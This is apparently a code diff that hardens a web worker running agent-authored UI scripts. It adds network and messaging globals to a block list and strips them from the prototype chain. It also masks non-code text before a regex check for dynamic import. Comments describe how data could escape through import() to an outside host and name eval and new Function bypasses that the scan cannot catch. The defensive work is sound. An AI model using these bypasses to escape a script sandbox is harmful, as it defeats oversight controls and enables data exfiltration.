@@ -1,3 +1,4 @@
+import { maskNonCode } from "./maskNonCode";
 import type {
   UiScriptMessageToMain,
   UiScriptMessageToWorker,
@@ -30,13 +31,26 @@ type UiScriptWorkerScope = {
 const workerScope = globalThis as unknown as UiScriptWorkerScope;
 
 /**
+ * Private postMessage used by this module after the guest-visible binding is
+ * shadowed. Captured at load — before any script runs — so forged
+ * `done` / `log` / `call` frames cannot ride the real channel.
+ */
+const postMessageToMain: UiScriptWorkerScope["postMessage"] =
+  workerScope.postMessage.bind(workerScope);
+
+/**
  * Globals removed before the script runs so the `ui` bridge is the worker's
  * only capability. Defense-in-depth, not a sandbox guarantee: a same-origin
  * worker is not a security boundary, and PXI scripts already run at user
  * trust level — this just makes "everything flows through dispatch" true in
  * practice.
+ *
+ * The messaging names are shadowed *after* this module registers its
+ * `message` listener and binds `postMessageToMain`. Guest scripts otherwise
+ * keep `postMessage` (forge protocol frames) and `dispatchEvent` (inject a
+ * synthetic `callResult` into that listener).
  */
-const BLOCKED_GLOBAL_NAMES = [
+export const BLOCKED_GLOBAL_NAMES = [
   "fetch",
   "XMLHttpRequest",
   "WebSocket",
@@ -49,10 +63,45 @@ const BLOCKED_GLOBAL_NAMES = [
   "navigator",
   "Worker",
   "SharedWorker",
-];
+  "postMessage",
+  "onmessage",
+  "onmessageerror",
+  "addEventListener",
+  "removeEventListener",
+  "dispatchEvent",
+  "close",
+] as const;
 
-function removeBlockedGlobals() {
-  for (const globalName of BLOCKED_GLOBAL_NAMES) {
+/**
+ * Remove globals from the entire prototype chain of `globalThis`, then shadow
+ * them as own properties.
+ *
+ * Shadowing `globalThis` alone is not enough: per WebIDL, interface
+ * *operations* (`fetch`, `importScripts`) and *attributes* (`navigator`,
+ * `indexedDB`, `caches`) live on `WorkerGlobalScope.prototype`, not on the
+ * global object — an own-property shadow leaves them recoverable via
+ * `Object.getPrototypeOf(globalThis)`. WebIDL interface members are
+ * configurable, so they can be deleted outright at each chain level; the
+ * non-configurable own-property shadow then covers anything an engine keeps
+ * (or adds in future) as an own property of the global.
+ */
+export function removeGlobalsEverywhere(names: readonly string[]): void {
+  const prototypeChain: object[] = [];
+  for (
+    let level: object | null = Object.getPrototypeOf(globalThis);
+    level != null;
+    level = Object.getPrototypeOf(level)
+  ) {
+    prototypeChain.push(level);
+  }
+  for (const globalName of names) {
+    for (const level of prototypeChain) {
+      try {
+        Reflect.deleteProperty(level, globalName);
+      } catch {
+        // Non-configurable in some engines; the shadow below still covers it.
+      }
+    }
     try {
       Object.defineProperty(globalThis, globalName, {
         value: undefined,
@@ -65,6 +114,10 @@ function removeBlockedGlobals() {
   }
 }
 
+function removeBlockedGlobals() {
+  removeGlobalsEverywhere(BLOCKED_GLOBAL_NAMES);
+}
+
 /** Resolvers for in-flight `ui.*` calls, keyed by callId. */
 const pendingCalls = new Map<number, (result: unknown) => void>();
 let nextCallId = 1;
@@ -73,7 +126,7 @@ function postOperationCall(operationName: string, input: unknown) {
   return new Promise((resolve) => {
     const callId = nextCallId++;
     pendingCalls.set(callId, resolve);
-    workerScope.postMessage({ type: "call", callId, operationName, input });
+    postMessageToMain({ type: "call", callId, operationName, input });
   });
 }
 
@@ -116,6 +169,8 @@ function describeError(error: unknown): string {
     : String(error);
 }
 
+const DYNAMIC_IMPORT_PATTERN = /\bimport\s*[.(]/;
+
 /**
  * Dynamic `import()` and `import.meta` are syntax, not properties, so
  * `removeBlockedGlobals` cannot reach them: `import("https://host/?" + data)`
@@ -124,21 +179,26 @@ function describeError(error: unknown): string {
  * before compiling, so the only route out of this realm stays the bridge.
  * (Static `import ... from` is already a SyntaxError inside `new Function`.)
  *
- * Source-level matching cannot distinguish `import(` in code from the same
- * bytes inside a string literal, so a script that carries `"import("` as data
- * is rejected too. That over-rejection is acceptable defense-in-depth: the
- * real capability boundary is main-thread dispatch, and a false positive is a
- * clear, retryable error rather than a silent failure.
+ * The scan runs on masked source (see `maskNonCode`), so comments and string
+ * contents neither smuggle an import past the check (`import∕**∕(`) nor trip
+ * it as data (`"import("`, `importlib.reload`).
+ *
+ * Residual bypass by construction: `eval("import(...)")` and
+ * `new Function("return import(...)")()` carry the payload as runtime data
+ * and no source scan can see it — `Function` cannot be removed while the
+ * realm holds any function object. Closing that hole needs a network-layer
+ * control, which is why the worker script response carries a CSP of
+ * `script-src 'unsafe-eval'; connect-src 'none'` in production builds.
  */
 export function referencesDynamicImport(script: string): boolean {
-  return /\bimport\s*[.(]/.test(script);
+  return DYNAMIC_IMPORT_PATTERN.test(maskNonCode(script));
 }
 
 async function evaluateUiScript(script: string) {
   removeBlockedGlobals();
   const ui = createUiProxy();
   const log = (message: unknown) => {
-    workerScope.postMessage({ type: "log", message: String(message) });
+    postMessageToMain({ type: "log", message: String(message) });
   };
   // The script body may `await` ui calls and `return` a final value. Dynamic
   // evaluation is the point of this worker: the agent-authored script is data
@@ -148,7 +208,7 @@ async function evaluateUiScript(script: string) {
   // and burn the whole execution budget in silence), and "failed to parse"
   // tells the model to fix its syntax rather than re-issue the script.
   if (referencesDynamicImport(script)) {
-    workerScope.postMessage({
+    postMessageToMain({
       type: "failed",
       error:
         "The script uses `import`, which is not available in execute_ui — " +
@@ -165,7 +225,7 @@ async function evaluateUiScript(script: string) {
       `"use strict"; return (async () => {\n${script}\n})();`
     ) as typeof runner;
   } catch (error) {
-    workerScope.postMessage({
+    postMessageToMain({
       type: "failed",
       error: `The script failed to parse — fix the syntax and retry. ${describeError(error)}`,
     });
@@ -173,12 +233,12 @@ async function evaluateUiScript(script: string) {
   }
   try {
     const returnValue: unknown = await runner(ui, log);
-    workerScope.postMessage({
+    postMessageToMain({
       type: "done",
       returnValue: serializeReturnValue(returnValue),
     });
   } catch (error) {
-    workerScope.postMessage({
+    postMessageToMain({
       type: "failed",
       error: describeError(error),
     });
